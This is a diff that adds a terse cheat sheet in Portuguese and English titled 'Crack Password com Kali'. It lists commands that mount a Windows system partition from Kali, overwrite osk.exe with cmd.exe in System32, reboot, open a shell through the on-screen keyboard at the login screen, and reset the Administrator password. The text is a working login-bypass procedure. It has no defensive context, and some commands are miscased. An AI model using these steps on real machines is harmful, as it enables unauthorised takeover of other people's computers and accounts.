@@ -1,0 +1,17 @@
+Crack Password com Kali
+
+- fdisk -L
+- mount /dev/sda2/ /mnt/
+- cd /mnt
+- Ls
+- cd Windows/
+- cd System32
+- find cmd.exe
+- find osk.exe
+- cp cmd.exe osk.exe
+- reboot
+
+Teclado virtual
+
+net user Administrator *
+
